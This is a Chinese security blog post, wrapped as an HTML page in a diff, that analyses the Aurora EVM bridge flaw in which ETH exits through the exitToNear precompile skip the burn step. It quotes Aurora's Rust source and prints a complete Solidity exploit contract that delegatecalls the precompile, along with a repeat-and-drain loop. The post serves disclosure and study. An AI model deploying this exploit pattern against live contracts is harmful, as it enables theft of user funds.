@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                Aurora 跨链桥销毁逻辑错误导致无ETH膨胀漏洞 |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Aurora 跨链桥销毁逻辑错误导致无ETH膨胀漏洞</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-11-25 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>5 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>Aurora EVM 最初由 NEAR 内部开发，是 NEAR 生态系统的官方 EVM。它实现了与以太坊协议的 1:1 体验，包括采用 ETH 作为基础货币。除了基本范围之外，EVM 还允许进行额外的预编译。此类预编译使 EVM 能够与 NEAR 生态系统的其余部分进行交互。其中包括exitToNear和exitToEthereum(只能通过 NEP-141 到 ERC-20 合约访问)。</p>
+<p>exitToNear、exitToEthereum预编译只能从 Aurora EVM 自部署的 NEP-141 映射 ERC-20 合约中调用。这些 ERC-20 合约是通过调用deploy_erc20_token函数来部署的。<br><a class="link" target="_blank" rel="noopener" href="https://doc.aurora.dev/evm/precompiles">https://doc.aurora.dev/evm/precompiles<i class="fas fa-external-link-alt"></i></a></p>
+<p>其中Aurora EVM转移代币到Near或着以太坊是以下两个预编译地址：</p>
+<p>0xe9217bc70b7ed1f598ddd3199e80b093fa71124f<br>将 ETH 或 NEP-141 映射的 ERC-20 代币作为 NEP-141 从 Aurora EVM 转移到 Near。</p>
+<p>0xb0bd02f6a392af548bdf1cfaee5dfa0eefcc8eab<br>通过Rainbow Bridge将 ETH 或 NEP-141 映射的 ERC-20 代币从 Aurora EVM 转移到以太坊。</p>
+<p>当flag是0x0时，Eth transfer</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>当flag是0x1时，Erc20 transfer</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>转移Erc20比转移Eth时，多了一步销毁的动作，这里将是问题的关键。</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>在上图代码转移Erc20代币前，会先销毁代币，逻辑上没有问题。接下来看下转移Eth时的逻辑。</p>
+<p>exitToNear、exitToEthereum预编译的作用</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> ExitToNear &#123;</span><br><span class="line">    <span class="comment">/// Exit to NEAR precompile address</span></span><br><span class="line">    <span class="comment">///</span></span><br><span class="line">    <span class="comment">/// Address: `0xe9217bc70b7ed1f598ddd3199e80b093fa71124f`</span></span><br><span class="line">    <span class="comment">/// This address is computed as: `&amp;keccak(&quot;exitToNear&quot;)[12..]`</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">const</span> ADDRESS: Address =</span><br><span class="line">        super::make_address(<span class="number">0xe9217bc7</span>, <span class="number">0x0b7ed1f598ddd3199e80b093fa71124f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(current_account_id: AccountId) -&gt; <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123; current_account_id &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> Precompile <span class="keyword">for</span> ExitToNear &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> (nep141_address, args, exit_event) = <span class="keyword">match</span> flag &#123;</span><br><span class="line">            <span class="number">0x0</span> =&gt; &#123;</span><br><span class="line">                <span class="comment">// ETH transfer</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// Input slice format:</span></span><br><span class="line">                <span class="comment">//      recipient_account_id (bytes) - the NEAR recipient account which will receive NEP-141 ETH tokens</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(dest_account) = AccountId::try_from(input) &#123;</span><br><span class="line">                    (</span><br><span class="line">                        current_account_id,</span><br><span class="line">                        <span class="comment">// There is no way to inject json, given the encoding of both arguments</span></span><br><span class="line">                        <span class="comment">// as decimal and valid account id respectively.</span></span><br><span class="line">                        <span class="built_in">format!</span>(</span><br><span class="line">                            <span class="string">r#&quot;&#123;&#123;&quot;receiver_id&quot;: &quot;&#123;&#125;&quot;, &quot;amount&quot;: &quot;&#123;&#125;&quot;, &quot;memo&quot;: null&#125;&#125;&quot;#</span>,</span><br><span class="line">                            dest_account,</span><br><span class="line">                            context.apparent_value.as_u128()</span><br><span class="line">                        ),</span><br><span class="line">                        events::ExitToNear &#123;</span><br><span class="line">                            sender: Address::new(context.caller),</span><br><span class="line">                            erc20_address: events::ETH_ADDRESS,</span><br><span class="line">                            dest: dest_account.to_string(),</span><br><span class="line">                            amount: context.apparent_value,</span><br><span class="line">                        &#125;,</span><br><span class="line">                    )</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">Err</span>(ExitError::Other(Cow::from(</span><br><span class="line">                        <span class="string">&quot;ERR_INVALID_RECEIVER_ACCOUNT_ID&quot;</span>,</span><br><span class="line">                    )));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> transfer_promise = PromiseCreateArgs &#123;</span><br><span class="line">            target_account_id: nep141_address,</span><br><span class="line">            method: <span class="string">&quot;ft_transfer&quot;</span>.to_string(),</span><br><span class="line">            args: args.as_bytes().to_vec(),</span><br><span class="line">            attached_balance: Yocto::new(<span class="number">1</span>),</span><br><span class="line">            attached_gas: costs::FT_TRANSFER_GAS,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="meta">#[cfg(feature = <span class="meta-string">&quot;error_refund&quot;</span>)]</span></span><br><span class="line">        <span class="keyword">let</span> promise = PromiseArgs::Callback(PromiseWithCallbackArgs &#123;</span><br><span class="line">            base: transfer_promise,</span><br><span class="line">            callback: refund_promise,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="meta">#[cfg(not(feature = <span class="meta-string">&quot;error_refund&quot;</span>))]</span></span><br><span class="line">        <span class="keyword">let</span> promise = PromiseArgs::Create(transfer_promise);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> promise_log = Log &#123;</span><br><span class="line">            address: Self::ADDRESS.raw(),</span><br><span class="line">            topics: <span class="built_in">Vec</span>::new(),</span><br><span class="line">            data: promise.try_to_vec().unwrap(),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> exit_event_log = exit_event.encode();</span><br><span class="line">        <span class="keyword">let</span> exit_event_log = Log &#123;</span><br><span class="line">            address: Self::ADDRESS.raw(),</span><br><span class="line">            topics: exit_event_log.topics,</span><br><span class="line">            data: exit_event_log.data,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="literal">Ok</span>(PrecompileOutput &#123;</span><br><span class="line">            logs: <span class="built_in">vec!</span>[promise_log, exit_event_log],</span><br><span class="line">            ..<span class="built_in">Default</span>::default()</span><br><span class="line">        &#125;</span><br><span class="line">        .into())</span><br></pre></td></tr></table></figure>
+
+<p>如果标志是0x0，将生成一个事件“ExitToNear”，记录这个出口的“sender”，“dest”和“amount”，然后返回包含事件信息的’ exit_event_log ‘。</p>
+<p>这些日志以及执行期间的所有其他日志将由’ filter_promises_from_logs ‘检查。</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">filter_promises_from_logs</span></span>&lt;T, P&gt;(handler: &amp;<span class="keyword">mut</span> P, logs: T) -&gt; <span class="built_in">Vec</span>&lt;ResultLog&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    T: <span class="built_in">IntoIterator</span>&lt;Item = Log&gt;,</span><br><span class="line">    P: PromiseHandler,</span><br><span class="line">&#123;</span><br><span class="line">    logs.into_iter()</span><br><span class="line">        .filter_map(|log| &#123;</span><br><span class="line">            <span class="keyword">if</span> log.address == ExitToNear::ADDRESS.raw()</span><br><span class="line">                || log.address == ExitToEthereum::ADDRESS.raw()</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> log.topics.is_empty() &#123;</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(promise) = PromiseArgs::try_from_slice(&amp;log.data) &#123;</span><br><span class="line">                        <span class="keyword">match</span> promise &#123;</span><br><span class="line">                            PromiseArgs::Create(promise) =&gt; schedule_promise(handler, &amp;promise),</span><br><span class="line">                            PromiseArgs::Callback(promise) =&gt; &#123;</span><br><span class="line">                                <span class="keyword">let</span> base_id = schedule_promise(handler, &amp;promise.base);</span><br><span class="line">                                schedule_promise_callback(handler, base_id, &amp;promise.callback)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要使用硬编码地址生成日志ExitTo(Near|Ethereum)::ADDRESS，log.data就会将其作为要安排的新承诺进行处理。</p>
+<p>因为log在AUrora上的验证只需要满足“是否由内置合约地址生成”以及“msg.value是否大于0“即可通过验证。</p>
+<p>第一个条件时天然达成的。</p>
+<p>要达成第二个条件，在这里利用DELEGATECALL来代替CALL进行调用合约(Aurora只禁用了STATICCALL却没有禁用DELEGATECALL)。</p>
+<p>DELEGATECALL与CALL的区别如下图</p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>当使用DELEGATECALL调用时，msg.data/msg.value只会进行值传递，却不会变化拥有者。</p>
+<p>所以这个漏洞的利用链就成熟了，如下：</p>
+<pre><code>1.    在Aurora上部署恶意合约，通过DELEGATECALL去调用ExitToNear(0xe9217bc70b7ed1f598ddd3199e80b093fa71124f内置合约地址)
+2.    调用下述恶意代码，Aurora将被诱骗向Near上的调用方发送nETH，但是却不会销毁发起合约的代币，从而实现窃取
+</code></pre>
+<figure class="highlight plaintext"><figcaption><span>Exploit.sol</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line"></span><br><span class="line">contract Exploit &#123;</span><br><span class="line">    address payable private owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit(bytes memory recipient) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        bytes memory input = abi.encodePacked(&quot;\x00&quot;, recipient);</span><br><span class="line">        uint input_size = 1 + recipient.length;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let res := delegatecall(gas(), 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        owner.transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<pre><code>3.    要保证恶意合约初始有部分余额，然后通过窃取-转回-再窃取的循环，指数爆炸，最终实现窃取所有代币
+</code></pre>
+<p><a class="link" target="_blank" rel="noopener" href="https://medium.com/immunefi/aurora-infinite-spend-bugfix-review-6m-payout-e635d24273d">https://medium.com/immunefi/aurora-infinite-spend-bugfix-review-6m-payout-e635d24273d<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://pwning.mirror.xyz/CB4XUkbJVwPo7CaRwRmCApaP2DMjPQccW-NOcCwQlAs">https://pwning.mirror.xyz/CB4XUkbJVwPo7CaRwRmCApaP2DMjPQccW-NOcCwQlAs<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Aurora 跨链桥销毁逻辑错误导致无ETH膨胀漏洞</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2022-11-25 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/Aurora 跨链桥销毁逻辑错误导致无ETH膨胀漏洞/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/%E9%9D%A2%E5%90%91%E5%AE%9E%E6%88%98%E7%9A%84%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E5%8D%87%E7%BA%A7&amp;HW%E5%87%86%E5%A4%87/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">面向实战的基础安全体系升级&amp;HW准备</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Aurora%E9%94%80%E6%AF%81%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E4%BB%A3%E5%B8%81%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Aurora销毁逻辑错误导致代币窃取漏洞</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
